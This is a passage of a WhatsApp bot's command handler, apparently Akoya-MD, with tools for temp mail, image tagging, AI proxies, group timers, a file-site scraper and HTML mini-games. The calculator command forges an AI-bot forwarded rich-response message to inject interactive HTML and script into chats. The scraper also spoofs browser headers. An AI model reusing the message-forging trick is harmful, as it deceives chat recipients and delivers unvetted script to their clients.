From: ${message.from || 'Anomali'}\n*Subject :* ${message.subject || 'No Subject'}\n\n*Message :*\n${cleanContent}`;
                      await client.sendMessage(m.chat, {
                        text: messageInfo
                      }, {
                        quoted: m
                      });
                      state.processedMessages.add(message.id);
                    }
                  }
                }
              } catch (error) {
                console.error('Error:', error);
              }
            };
            await processInbox();
            const checkInterval = setInterval(processInbox, 10000);
            setTimeout(() => {
              state.isRunning = false;
              clearInterval(checkInterval);
              xreply("This email is deleted automatically after 10 minutes");
            }, 600000);
          } catch (error) {
            xreply(`Error: ${error.message}`);
          }
        }
        break;

      /// ───────────── [ 𝖠𝗇𝗂𝗆𝖾 𝖥𝗂𝗇𝖽𝖾𝗋 ] ──────────── ///
      case 'animefind':
        {
          try {
            const quoted = m.quoted ? m.quoted : m;
            const mime = (quoted.msg || quoted).mimetype || '';
            if (!/image/.test(mime)) return xreply("please reply to the image you want to search");
            const media = await quoted.download();
            const detect = async buffer => {
              const axios = require('axios');
              const BodyForm = require('form-data');
              const {
                fromBuffer
              } = require('file-type');
              return new Promise(async (resolve, reject) => {
                try {
                  const BASE_URL = "https://smilingwolf-wd-tagger.hf.space/gradio_api";
                  const session_hash = Math.random().toString(36).substring(2);
                  const file_name = Math.random().toString(36).substring(2);
                  const hr = {
                    origin: "https://smilingwolf-wd-tagger.hf.space",
                    referer: "https://smilingwolf-wd-tagger.hf.space/",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
                    "content-type": "application/json"
                  };
                  const {
                    ext,
                    mime
                  } = (await fromBuffer(buffer)) || {};
                  const form = new BodyForm();
                  form.append("files", buffer, {
                    filename: file_name + "." + ext,
                    contentType: mime
                  });
                  const files = await axios.post(BASE_URL + "/upload?" + new URLSearchParams({
                    upload_id: session_hash
                  }), form, {
                    headers: {
                      ...hr,
                      ...form.getHeaders()
                    }
                  }).then(i => i.data);
                  const file_res = {
                    path: files[0],
                    mime_type: mime,
                    orig_name: file_name + "." + ext,
                    meta: {
                      _type: "gradio.FileData"
                    },
                    size: buffer.length,
                    url: BASE_URL + "/file=" + files[0]
                  };
                  await axios.post(BASE_URL + "/queue/join?", {
                    data: [file_res, "SmilingWolf/wd-swinv2-tagger-v3", 0.35, true, 0.85, true],
                    event_data: null,
                    fn_index: 2,
                    session_hash,
                    trigger_id: 18
                  });
                  const stream = await axios.get(BASE_URL + "/queue/data?" + new URLSearchParams({
                    session_hash
                  }), {
                    headers: {
                      ...hr,
                      "content-type": "text/event-stream"
                    },
                    responseType: "stream"
                  });
                  let result = '';
                  stream.data.on('data', chunk => {
                    result += chunk.toString();
                    const lines = result.split('\n');
                    result = lines.pop();
                    for (const line of lines) {
                      if (line.startsWith('data: ')) {
                        try {
                          const data = JSON.parse(line.substring(6));
                          if (data.msg !== "process_completed") continue;
                          if (!data.success) return resolve({
                            status: false,
                            data
                          });
                          const dt = data.output.data;
                          const is_char = typeof dt[2]?.label === 'string';
                          const res = {
                            prompt: dt[0],
                            rating: dt[1].confidences,
                            character: {
                              name: dt[2]?.label,
                              list: dt[2]?.confidences
                            },
                            tags: {
                              name: dt[3].label,
                              list: dt[3].confidences
                            }
                          };
                          return resolve({
                            status: true,
                            data: res,
                            is_char
                          });
                        } catch (err) {
                          console.error('Error parsing JSON:', err);
                          resolve({
                            status: false,
                            msg: err.message
                          });
                        }
                      }
                    }
                  });
                } catch (e) {
                  reject(e);
                }
              });
            };
            const res = await detect(media);
            const fixed = num => (num * 100).toFixed(2);
            if (!res.is_char) return xreply("no characters were detected in that image");
            const teks = `
*⎣⧉⎤ Karakter detected is*
> *Name:* ${res.data.character.name}
> *Percentage:* ${fixed(res.data.character.list[0].confidence || 0)}%
${res.data.character.list.length >= 2 ? `
*⎣⧉⎤ Karakter lain terdeteksi*
${res.data.character.list.map(it => `> *Nama:* ${it.label}\n> *Percentage:* ${fixed(it.confidence || 0)}%`).join('\n\n')}\n` : ''}
*⎣⧉⎤ Prompt*
${res.data.prompt}

*⎣⧉⎤ Rating*
${res.data.rating.map(it => `> *${it.label}:* ${fixed(it.confidence || 0)}%`).join('\n')}

*⎣⧉⎤ Tag*
${res.data.tags.list.map(it => `> *${it.label}:* ${fixed(it.confidence || 0)}%`).join('\n')}
`.trim();
            xreply(teks);
          } catch (e) {
            console.error(e);
            xreply(`an error occurred during mendeteksi character!

${e.message}`);
          }
        }
        break;

      /// ───────────── [ 𝖬𝖾𝗂𝗀𝖾𝗇 𝖲𝖾𝖺𝗋𝖼𝗁 ] ──────────── ///
      case 'meigen':
      case 'meigensearch':
        {
          if (!text) {
            return xreply(`example:
${prefix + command} anime girl`);
          }
          try {
            const res = await fetch(`https://www.meigen.ai/api/search?q=${encodeURIComponent(text)}`);
            if (!res.ok) {
              throw new Error(`HTTP ${res.status}`);
            }
            const json = await res.json();
            if (!json?.success || !Array.isArray(json.data) || json.data.length < 1) {
              return xreply("❌ Prompt not found.");
            }
            const data = json.data[Math.floor(Math.random() * json.data.length)];
            const caption = `*🌸 MEIGEN SEARCH*

*Query:* ${text}

*Author:* ${data.author_display_name || '-'}
*Username:* @${data.author_username || '-'}
*Model:* ${data.model || '-'}

*📊 Statistik*
• Likes: ${data.likes || 0}
• Views: ${data.views || 0}
• Favorites: ${data.favorites_count || 0}

*📝 Prompt:*
${(data.text || "no prompt provided").length > 1500 ? data.text.slice(0, 1500) + '...' : data.text || "no prompt provided"}`;
            if (data.thumbnail_url) {
              await client.sendMessage(m.chat, {
                image: {
                  url: data.thumbnail_url
                },
                caption
              }, {
                quoted: m
              });
            } else {
              await xreply(caption);
            }
          } catch (e) {
            console.error(e);
            xreply(`❌ Error: ${e.message}`);
          }
        }
        break;

      /// ───────────── [ 𝖬𝖾𝗍𝖺 𝖠𝖨 ] ──────────── ///
      case "metaai":
        {
          if (!text) return xreply("*example:*.metaai What is JavaScript?");
          Reply(mess.wait);
          try {
            const apiUrl = `https://api.siputzx.my.id/api/ai/metaai?query=${encodeURIComponent(q)}`;
            const response = await axios.get(apiUrl);
            const data = response.data;
            if (data.status && data.data) {
              await xreply(`*Meta AI*\n\n${data.data}`);
            } else {
              Reply("❌ failed to get respons from Meta AI");
            }
          } catch (error) {
            console.error("Meta AI Error:", error);
            Reply(mess.error);
          }
        }
        break;

      /// ───────────── [ 𝖲𝗈𝗈𝗇𝖾𝗑 𝖠𝖨 ] ──────────── ///
      case 'soonex':
        {
          if (!text) {
            return xreply(`example:
.soonex halo`);
          }
          try {
            const fetch = require('node-fetch');
            await client.sendMessage(m.chat, {
              react: {
                text: '🤖',
                key: m.key
              }
            });
            let res = await fetch(`https://api.soonex.biz.id/v1/ai/soonex?text=${encodeURIComponent(text)}`);
            let data = await res.json();
            console.log(data);
            let hasil = data.result || data.answer || data.message || "no response from AI";
            await client.sendMessage(m.chat, {
              text: hasil
            }, {
              quoted: m
            });
          } catch (e) {
            console.log(e);
            xreply("❌ an error occurred while fetching respon AI");
          }
        }
        break;

      /// ───────────── [ 𝖢𝗁𝖾𝖼𝗄 𝗀𝗋𝗈𝗎𝗉 𝖨𝖣 ] ──────────── ///
      case "idgc":
      case "cekidgc":
        {
          if (!m.isGroup) return reply(mess.group);
          xreply(m.chat);
        }
        break;

      /// ───────────── [ 𝖯𝗂𝗅𝗈𝗍 (𝖤𝗉𝗌𝗂𝗅𝗈𝗇 𝖠𝖨) ] ──────────── ///
      case 'pilot':
        {
          try {
            if (!text) {
              return xreply(`*Example*\n${prefix + command} keadilan`);
            }
            await client.sendMessage(m.chat, {
              react: {
                text: '⏳',
                key: m.key
              }
            });
            const params = new URLSearchParams({
              originalQuery: text,
              transformedQuery: text,
              filter: JSON.stringify({
                publishedYearMin: 2000,
                publishedYearMax: 2024,
                citationMin: 0,
                journalFilter: 'ALL'
              }),
              threadId: '4066ca5f-b0dd-46d9-9241-d39986f618c0',
              numPapers: 15,
              existingCorpusIds: JSON.stringify([]),
              forceUseEpsilonDb: false
            });
            const res = await fetch(`https://www.epsilon-ai.com/api/semantic-scholar/question-retrieval?${params.toString()}`, {
              headers: {
                Accept: 'application/json, text/plain, */*',
                'User-Agent': 'Mozilla/5.0'
              }
            });
            if (!res.ok) {
              throw new Error("failed to fetch data from Epsilon AI");
            }
            const data = await res.json();
            if (!data.papers || !data.papers.length) {
              return xreply("🍂 *no relevant insight found.*");
            }
            const papers = data.papers.slice(0, 5);
            let output = `🧠 *Epsilon AI – Quick Insight*\n\n`;
            output += `🔎 *Topik:* ${text}\n`;
            output += `📄 *Total Paper:* ${data.papers.length}\n`;
            output += `⚡ *shown:* quick insights (Top 5)

`;
            for (let i = 0; i < papers.length; i++) {
              const p = papers[i];
              const insight = p.abstract ? p.abstract.split('. ').slice(0, 2).join('. ') + '.' : "concise insight unavailable.";
              output += `📌 *${i + 1}. ${p.title || 'Untitled'}*\n`;
              output += `📅 *Year:* ${p.year || '-'}\n`;
              output += `💡 *Insight:* ${insight}\n`;
              output += `🔗 ${p.url || '-'}\n\n`;
            }
            await xreply(output.trim());
          } catch (e) {
            await xreply(`🍂 *an error occurred*

${e.message}`);
          } finally {
            await client.sendMessage(m.chat, {
              react: {
                text: '',
                key: m.key
              }
            });
          }
        }
        ;
        break;
      case "pilot2":
        {
          try {
            if (!text) {
              return xreply(`*Example*\n${prefix + command} keadilan`);
            }
            await client.sendMessage(m.chat, {
              react: {
                text: '⏳',
                key: m.key
              }
            });
            const params = new URLSearchParams({
              originalQuery: text,
              transformedQuery: text,
              filter: JSON.stringify({
                publishedYearMin: 2000,
                publishedYearMax: 2024,
                citationMin: 0,
                journalFilter: 'ALL'
              }),
              threadId: '4066ca5f-b0dd-46d9-9241-d39986f618c0',
              numPapers: 15,
              existingCorpusIds: JSON.stringify([]),
              forceUseEpsilonDb: false
            });
            const res = await fetch(`https://www.epsilon-ai.com/api/semantic-scholar/question-retrieval?${params.toString()}`, {
              headers: {
                Accept: 'application/json, text/plain, */*',
                'User-Agent': 'Mozilla/5.0'
              }
            });
            if (!res.ok) {
              throw new Error("failed to fetch data from Epsilon AI");
            }
            const data = await res.json();
            if (!data.papers || !data.papers.length) {
              return xreply("🍂 *no relevant insight found.*");
            }
            const papers = data.papers.slice(0, 5);
            let output = `🧠 *Epsilon AI – Quick Insight*\n\n`;
            output += `🔎 *Topik:* ${text}\n`;
            output += `📄 *Total Paper:* ${data.papers.length}\n`;
            output += `⚡ *shown:* quick insights (Top 5)

`;
            for (let i = 0; i < papers.length; i++) {
              const p = papers[i];
              const insight = p.abstract ? p.abstract.split('. ').slice(0, 2).join('. ') + '.' : "concise insight unavailable.";
              output += `📌 *${i + 1}. ${p.title || 'Untitled'}*\n`;
              output += `📅 *Year:* ${p.year || '-'}\n`;
              output += `💡 *Insight:* ${insight}\n`;
              output += `🔗 ${p.url || '-'}\n\n`;
            }
            await xreply(output.trim());
          } catch (e) {
            await xreply(`🍂 *an error occurred*

${e.message}`);
          } finally {
            await client.sendMessage(m.chat, {
              react: {
                text: '',
                key: m.key
              }
            });
          }
        }
        ;
        break;

      /// ───────────── [ 𝖮𝗉𝖾𝗇/𝖢𝗅𝗈𝗌𝖾 𝖳𝗂𝗆𝖾 ] ──────────── ///
      case 'opentime':
        {
          if (!isOwner && !isPremium) return reply(mess.owner);
          if (!args[0] || isNaN(args[0])) return xreply("• time format: seconds, minutes, hours, days\n• example: 10 seconds");
          const timeUnits = {
            'detik': 1000, 'seconds': 1000,
            'menit': 60000, 'minutes': 60000,
            'jam': 3600000, 'hour': 3600000,
            'hari': 86400000, 'day': 86400000
          };
          const unit = args[1]?.toLowerCase();
          if (!timeUnits[unit]) return xreply("• time format: seconds, minutes, hours, days\n• example: 10 seconds");
          const timer = parseInt(args[0]) * timeUnits[unit];
          xreply(`Open time ${args[0]} ${unit} starting now`);
          setTimeout(() => {
            try {
              client.groupSettingUpdate(m.chat, 'not_announcement');
              xreply("*time* the group was opened by an admin\nmembers can now send messages");
            } catch (err) {
              xreply("an error occurred during membuka group");
              console.log(err);
            }
          }, timer);
        }
        break;
      case 'closetime':
        {
          if (!isOwner && !isPremium) return reply(mess.owner);
          if (!args[0] || isNaN(args[0])) return xreply("• time format: seconds, minutes, hours, days\n• example: 10 seconds");
          const timeUnits = {
            'detik': 1000, 'seconds': 1000,
            'menit': 60000, 'minutes': 60000,
            'jam': 3600000, 'hour': 3600000,
            'hari': 86400000, 'day': 86400000
          };
          const unit = args[1]?.toLowerCase();
          if (!timeUnits[unit]) return xreply("• time format: seconds, minutes, hours, days\n• example: 10 seconds");
          const timer = parseInt(args[0]) * timeUnits[unit];
          xreply(`Close time ${args[0]} ${unit} starting now`);
          setTimeout(() => {
            try {
              client.groupSettingUpdate(m.chat, 'announcement');
              xreply("*time* the group was closed by an admin\nonly admins can now send messages");
            } catch (err) {
              xreply("an error occurred during menutup group");
              console.log(err);
            }
          }, timer);
        }
        break;

      /// ───────────── [ 𝖲𝗄𝗂𝗉 𝖦𝗂𝗍𝗌 𝖢𝗈𝖽𝖾 ] ──────────── ///
      case "skipcode":
        {
          try {
            let [link, type] = text.split(" ");
            if (!link.includes("github")) return xreply(`⚠️ enter the Gits Code link!
 \`--doc\` send the code message as a document`);
            const id = (link.match(/gist\.github\.com\/(?:[^\/]+\/)?([a-zA-Z0-9]+)/) || [])[1] || link.split('/').pop().split('#')[0];
            const getRaw = await (await axios.get(`https://api.github.com/gists/${id}`)).data;
            const files = Object.values(getRaw?.files || []);
            for (let i = 0; files.length > 0 && i < files.length; i++) {
              const file = files[i];
              if (type?.endsWith("--doc")) {
                const buffer = Buffer.from(file.content, "utf-8");
                await client.sendMessage(m.chat, {
                  document: buffer,
                  fileName: file.filename,
                  mimetype: file.type
                }, {
                  quoted: m
                });
              } else {
                await xreply(file.content);
              }
              ;
            }
            ;
          } catch (e) {
            xreply("❌ Gomene Error Maybe you kebanyakan request");
            console.error(e);
          }
          ;
        }
        ;
        break;

      /// ───────────── [ 𝖦𝗋𝗈𝗎𝗉 𝗌𝗍𝖺𝗍𝗎𝗌 & 𝖼𝗁𝖾𝖼𝗄 ] ──────────── ///
      case 'totalchat':
      case 'statgroup':
        {
          if (!m.isGroup) return xreply("This feature can only be used in a group.");
          const stats = getTodayStats(m.chat);
          if (Object.keys(stats).length === 0) return xreply("No chat data recorded today.");
          let teks = `*Today's Chat Statistics:*\n\n`;
          const sorted = Object.entries(stats).sort((a, b) => b[1] - a[1]);
          let i = 1;
          for (const [user, total] of sorted) {
            const name = client.getName ? await client.getName(user) : user.split('@')[0];
            teks += `${i++}. ${name} - ${total} chat\n`;
          }
          xreply(teks);
        }
        break;

      /// ───────────── [ 𝖲𝖿𝗂𝗅𝖾 (𝖲𝖿𝗂𝗅𝖾.𝗆𝗈𝖻𝗂) ] ──────────── ///
      case 'sf':
      case 'sfile':
        {
          try {
            const axios = require("axios");
            const mime = require("mime-types");
            const cheerio = require("cheerio");
            const sfile = {
              createHeaders: referer => ({
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="137", "Google Chrome";v="137"',
                'dnt': '1',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'Referer': referer,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9'
              }),
              extractCookies: h => h['set-cookie']?.map(c => c.split(';')[0]).join('; ') || '',
              extractMetadata: $ => {
                const m = {};
                $('.file-content').eq(0).each((_, e) => {
                  const x = $(e);
                  m.file_name = x.find('img').attr('alt');
                  m.mimetype = x.find('.list').eq(0).text().trim().split('-')[1].trim();
                  m.upload_date = x.find('.list').eq(2).text().trim().split(':')[1].trim();
                  m.download_count = x.find('.list').eq(3).text().trim().split(':')[1].trim();
                  m.author_name = x.find('.list').eq(1).find('a').text().trim();
                });
                return m;
              },
              makeRequest: async (u, o) => {
                try {
                  return await axios.get(u, o);
                } catch (e) {
                  if (e.response) return e.response;
                  throw new Error(`Request failed: ${e.message}`);
                }
              },
              download: async (url, resultBuffer = false) => {
                try {
                  let h = sfile.createHeaders(url);
                  const init = await sfile.makeRequest(url, {
                    headers: h
                  });
                  const ck = sfile.extractCookies(init.headers);
                  h.Cookie = ck;
                  let $ = cheerio.load(init.data);
                  const meta = sfile.extractMetadata($);
                  const dl = $('#download').attr('href');
                  if (!dl) throw new Error('Download URL gak ketemu');
                  h.Referer = dl;
                  const proc = await sfile.makeRequest(dl, {
                    headers: h
                  });
                  const html = proc.data;
                  $ = cheerio.load(html);
                  const scr = $('script').map((i, el) => $(el).html()).get().join('\n');
                  const re = /https:\\\/\\\/download\d+\.sfile\.mobi\\\/downloadfile\\\/\d+\\\/\d+\\\/[a-z0-9]+\\\/[^\s'"]+\.[a-z0-9]+(\?[^"']+)?/gi;
                  const mt = scr.match(re);
                  if (!mt?.length) throw new Error('Link download final gak ketemu in script');
                  const fin = mt[0].replace(/\\\//g, '/');
                  let download;
                  if (resultBuffer) {
                    const file = await sfile.makeRequest(fin, {
                      headers: h,
                      responseType: 'arraybuffer'
                    });
                    download = Buffer.from(file.data);
                  } else download = fin;
                  return {
                    metadata: meta,
                    download
                  };
                } catch (e) {
                  throw new Error(`${e.message}`);
                }
              }
            };
            if (!args[0]) return xreply('*Example :* .sfile https://sfile.mobi/2E5O1HMVKcc');
            let data = await sfile.download(args[0], true);
            let {
              file_name,
              mimetype,
              upload_date,
              download_count,
              author_name
            } = data.metadata;
            let type = mime.lookup(file_name) || 'application/octet-stream';
            await client.sendMessage(m.chat, {
              document: data.download,
              fileName: file_name,
              mimetype: type
            }, {
              quoted: m
            });
          } catch (e) {
            xreply(e.message);
          }
        }
        break;

      /// ───────────── [ 𝖦𝖺𝗆𝖾 𝖱𝗂𝖼𝗁 (𝖨𝗇𝗍𝖾𝗋𝖺𝖼𝗍𝗂𝗏𝖾 𝖧𝖳𝖬𝖫) ] ──────────── ///
      case "calculator":
      case "kalkulator":
        {
          const html = String.raw`
<style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@700;900&display=swap');

    * {
        -webkit-tap-highlight-color: transparent;
        -webkit-user-select: none;
        user-select: none;
        box-sizing: border-box;
    }
</style>

<body
    style="
        margin: 0;
        background: #0A0A0F;
        font-family: 'Roboto', Arial, sans-serif;
        color: #fff;
        touch-action: manipulation;
    "
>
    <div
        style="
            width: 100%;
            max-width: 420px;
            margin: auto;
            padding: 16px;
        "
    >
        <div
            style="
                background: linear-gradient(180deg, #111118 0%, #0A0A0F 100%);
                border: 2px solid #2A2A35;
                border-radius: 18px;
                padding: 20px;
                box-shadow: 0 0 25px rgba(0, 140, 255, .12);
            "
        >
            <div
                style="
                    font-size: 11px;
                    letter-spacing: 2px;
                    color: #00A2FF;
                    margin-bottom: 8px;
                    font-weight: 900;
                "
            >
                client CALCULATOR
            </div>

            <div
                id="display"
                style="
                    background: #16161F;
                    border: 2px solid #2E2E3A;
                    border-radius: 12px;
                    padding: 18px;
                    margin-bottom: 16px;
                    text-align: right;
                    font-size: 32px;
                    font-weight: 900;
                    min-height: 60px;
                    word-wrap: break-word;
                    box-shadow: inset 0 0 15px rgba(0, 0, 0, .4);
                "
            >
                0
            </div>

            <div
                id="sub"
                style="
                    text-align: right;
                    font-size: 14px;
                    color: #8A8A9E;
                    margin-top: -12px;
                    margin-bottom: 16px;
                    height: 18px;
                "
            >
                
            </div>

            <div
                style="
                    display: grid;
                    grid-template-columns: repeat(4, 1fr);
                    gap: 10px;
                "
            >
                <button class="btn op" data-v="C">C</button>
                <button class="btn op" data-v="DEL">⌫</button>
                <button class="btn op" data-v="%">%</button>
                <button class="btn op" data-v="/">÷</button>

                <button class="btn num" data-v="7">7</button>
                <button class="btn num" data-v="8">8</button>
                <button class="btn num" data-v="9">9</button>
                <button class="btn op" data-v="*">×</button>

                <button class="btn num" data-v="4">4</button>
                <button class="btn num" data-v="5">5</button>
                <button class="btn num" data-v="6">6</button>
                <button class="btn op" data-v="-">−</button>

                <button class="btn num" data-v="1">1</button>
                <button class="btn num" data-v="2">2</button>
                <button class="btn num" data-v="3">3</button>
                <button class="btn op" data-v="+">+</button>

                <button
                    class="btn num"
                    data-v="0"
                    style="grid-column: span 2"
                >
                    0
                </button>

                <button class="btn num" data-v=".">.</button>
                <button class="btn eq" data-v="=">=</button>
            </div>
        </div>
    </div>

    <style>
        .btn {
            border: none;
            border-radius: 10px;
            padding: 16px;
            font-size: 20px;
            font-weight: 900;
            cursor: pointer;
            transition: .15s;
            background: #1F1F29;
            color: #fff;
            border: 1px solid #2E2E3A;
        }

        .btn:active {
            transform: scale(.92);
        }

        .num:hover {
            background: #25252F;
        }

        .op {
            background: #23232E;
            color: #00A2FF;
        }

        .op:hover {
            background: #2A2A35;
            box-shadow: 0 0 10px rgba(0, 162, 255, .3);
        }

        .eq {
            background: linear-gradient(135deg, #00A2FF, #0080FF);
            color: #fff;
            box-shadow: 0 0 15px rgba(0, 162, 255, .4);
        }

        .eq:hover {
            filter: brightness(1.15);
        }
    </style>

    <script>
        let expr = '',
            display = document.getElementById('display'),
            sub = document.getElementById('sub');

        function update() {
            display.textContent = expr || '0';
        }

        function calculateExpression(input) {
            let index = 0;

            input = input
                .replace(/×/g, '*')
                .replace(/÷/g, '/')
                .replace(/−/g, '-')
                .replace(/\s+/g, '');

            function parseExpression() {
                let value = parseTerm();

                while (index < input.length) {
                    let op = input[index];

                    if (op !== '+' && op !== '-') {
                        break;
                    }

                    index++;

                    let right = parseTerm();

                    if (op === '+') {
                        value += right;
                    } else {
                        value -= right;
                    }
                }

                return value;
            }

            function parseTerm() {
                let value = parseFactor();

                while (index < input.length) {
                    let op = input[index];

                    if (
                        op !== '*' &&
                        op !== '/' &&
                        op !== '%'
                    ) {
                        break;
                    }

                    index++;

                    let right = parseFactor();

                    if (op === '*') {
                        value *= right;
                    } else if (op === '/') {
                        if (right === 0) {
                            throw new Error('Division by zero');
                        }

                        value /= right;
                    } else if (op === '%') {
                        if (right === 0) {
                            throw new Error('Division by zero');
                        }

                        value %= right;
                    }
                }

                return value;
            }

            function parseFactor() {
                if (input[index] === '+') {
                    index++;
                    return parseFactor();
                }

                if (input[index] === '-') {
                    index++;
                    return -parseFactor();
                }

                if (input[index] === '(') {
                    index++;

                    let value = parseExpression();

                    if (input[index] !== ')') {
                        throw new Error('Invalid expression');
                    }

                    index++;

                    return value;
                }

                let start = index;
                let hasDot = false;

                while (index < input.length) {
                    let char = input[index];

                    if (char >= '0' && char <= '9') {
                        index++;
                        continue;
                    }

                    if (char === '.') {
                        if (hasDot) {
                            throw new Error('Invalid number');
                        }

                        hasDot = true;
                        index++;
                        continue;
                    }

                    break;
                }

                if (start === index) {
                    throw new Error('Invalid expression');
                }

                let number = Number(input.slice(start, index));

                if (!isFinite(number)) {
                    throw new Error('Invalid number');
                }

                return number;
            }

            let result = parseExpression();

            if (index !== input.length) {
                throw new Error('Invalid expression');
            }

            if (!isFinite(result)) {
                throw new Error('Invalid result');
            }

            return result;
        }

        function calc() {
            try {
                let res = calculateExpression(expr);

                sub.textContent = expr + ' =';
                expr = String(res);
            } catch (e) {
                expr = 'Error';

                setTimeout(() => {
                    expr = '';
                    update();
                }, 1200);
            }

            update();
        }

        document.querySelectorAll('.btn').forEach(b => {
            b.onclick = () => {
                let v = b.dataset.v;

                if (v === 'C') {
                    expr = '';
                    sub.textContent = ' ';
                }

                else if (v === 'DEL') {
                    expr = expr.slice(0, -1);
                }

                else if (v === '=') {
                    calc();
                    return;
                }

                else {
                    expr += v;
                }

                update();
            }
        });
    </script>
</body>
    `;
          const data = {
            response_id: "PopiooNixelPopiooNixelPopiooNixel",
            sections: [{
              __typename: "GenAIUnifiedResponseSection",
              view_model: {
                __typename: "GenAISingleLayoutViewModel",
                primitive: {
                  __typename: "GenAIBotProgressStatusPrimitive",
                  title: "click this text",
                  is_in_progress: true
                }
              }
            }],
            embedded_screens: [{
              title: "Preview",
              content: [{
                __typename: "FOAIDNixelButtonSheets",
                tabs: [{
                  id: "tab_0",
                  tab_header: "Akoya-MD",
                  sections: [{
                    __typename: "GenAIUnifiedResponseSection",
                    view_model: {
                      __typename: "GenAISingleLayoutViewModel",
                      primitive: {
                        __typename: "GenAIaeacdsnwHtmlPrimitive",
                        payload: html,
                        url: "https://example.com",
                        trusted_sources: ["example.com"]
                      }
                    }
                  }],
                  step_entries: []
                }]
              }]
            }]
          };
          await client.relayMessage(m.chat, {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
              botMetadata: {
                messageDisclaimerText: "",
                richResponseSourcesMetadata: {}
              }
            },
            botForwardedMessage: {
              message: {
                richResponseMessage: {
                  messageType: 1,
                  unifiedResponse: {
                    data: Buffer.from(JSON.stringify(data)).toString('base64')
                  },
                  contextInfo: {
                    forwardingScore: 1,
                    isForwarded: true,
                    forwardedAiBotMessageInfo: {
                      botJid: "0@bot"
                    },
                    forwardOrigin: 4
                  }
                }
              }
            }
          }, {
            messageId: await client.generateMessageTag()
          });
        }
        break;
      case "pesawat":
      case "plane":
        {
          const html = `<style>
* { -webkit-tap-highlight-color: transparent; -webkit-user-select: none; user-select: none; -webkit-touch-callout: none; box-sizing: border-box; margin: 0; padding: 0; }
body { margin: 0; background: transparent; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; color: #fff; touch-action: none; overflow: hidden; }
.wrapper { width: 100%; max-width: 480px; margin: auto; padding: 12px; }
.card { background: linear-gradient(180deg, rgba(15,18,26,0.97), rgba(10,12,18,0.97)); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border: 2px solid #3b82f6; border-radius: 20px; overflow: hidden; box-shadow: 0 14px 44px rgba(0,0,0,0.75), inset 0 0 40px rgba(59,130,246,0.1); padding: 14px; position: relative; }
.header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
.title { font-size: 10px; letter-spacing: 1.5px; color: #60a5fa; font-weight: 800; text-transform: uppercase; display:flex; align-items:center; gap:6px; }
.title .dot{ width:6px; height:6px; border-radius:50%; background:#10b981; box-shadow:0 0 8px #10b981; animation: pulse 1.4s infinite; }
@keyframes pulse{ 0%,100%{opacity:1} 50%{opacity:.3} }
.score-badge { font-size: 20px; font-weight: 900; color: #60a5fa; text-shadow: 0 0 12px rgba(96,165,250,0.5); font-variant-numeric: tabular-nums; }
.best-badge { font-size: 10px; color: #94a3b8; font-variant-numeric: tabular-nums; }
.stat-row { display:flex; gap:8px; margin-bottom:8px; }
.stat-pill { flex:1; background:rgba(255,255,255,0.04); border:1px solid rgba(255,255,255,0.08); border-radius:10px; padding:5px 8px; text-align:center; }
.stat-pill .lbl{ font-size:8px; letter-spacing:1px; color:#64748b; text-transform:uppercase; font-weight:700; }
.stat-pill .val{ font-size:13px; font-weight:900; color:#fff; font-variant-numeric: tabular-nums; }
#game-container { position: relative; width: 100%; height: 350px; border-radius: 14px; overflow: hidden; border: 2px solid #1e293b; box-shadow: inset 0 0 30px rgba(0,0,0,0.6); }
canvas { width: 100%; height: 100%; display: block; background: #070a12; }
.controls { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
.btn { padding: 14px; font-size: 15px; font-weight: 800; border: none; border-radius: 12px; cursor: pointer; color: #fff; text-align: center; letter-spacing: 0.5px; position: relative; overflow: hidden; }
.btn-left { background: linear-gradient(135deg, #3b82f6, #2563eb); box-shadow: 0 4px 16px rgba(59,130,246,0.45), inset 0 1px 0 rgba(255,255,255,0.2); }
.btn-right { background: linear-gradient(135deg, #ec4899, #db2777); box-shadow: 0 4px 16px rgba(236,72,153,0.45), inset 0 1px 0 rgba(255,255,255,0.2); }
.btn:active { transform: scale(0.95); filter: brightness(0.9); }
.credit-bar { margin-top: 10px; text-align: center; font-size: 10px; font-weight: 800; letter-spacing: 1.5px; color: #94a3b8; text-transform: uppercase; border-top: 1px dashed rgba(255,255,255,0.12); padding-top: 8px; }
.credit-bar span { color: #60a5fa; text-shadow: 0 0 10px rgba(96,165,250,0.5); }
</style>
<body>
<div class="wrapper">
  <div class="card">
    <div class="header">
      <div>
        <div class="title"><span class="dot"></span>Akoya-MD</div>
        <h2 style="font-size: 17px; font-weight: 900; color: #fff; margin-top:2px;">Space Rush 🚀</h2>
      </div>
      <div style="text-align: right;">
        <div class="score-badge" id="score">0000</div>
        <div class="best-badge" id="best">BEST 0000</div>
      </div>
    </div>
    <div class="stat-row">
      <div class="stat-pill"><div class="lbl">Kills</div><div class="val" id="killsStat">0</div></div>
      <div class="stat-pill"><div class="lbl">Combo</div><div class="val" id="comboStat">x1</div></div>
      <div class="stat-pill"><div class="lbl">Coins</div><div class="val" id="coinsStat">0</div></div>
    </div>
    <div id="game-container">
      <canvas id="c"></canvas>
    </div>
    <div class="controls">
      <button class="btn btn-left" id="leftBtn">⬅️ LEFT</button>
      <button class="btn btn-right" id="rightBtn">RIGHT ➡️</button>
    </div>
    <div class="credit-bar">
      Engineered by <span>Akoya-MD • 2026</span> ⚡
    </div>
  </div>
</div>
<script>
(function() {
  var cvs = document.getElementById('c');
  var ctx = cvs.getContext('2d');
  var scoreEl = document.getElementById('score');
  var bestEl = document.getElementById('best');
  var killsStatEl = document.getElementById('killsStat');
  var comboStatEl = document.getElementById('comboStat');
  var coinsStatEl = document.getElementById('coinsStat');
  var W = 360;
  var H = 350;
  cvs.width = W;
  cvs.height = H;
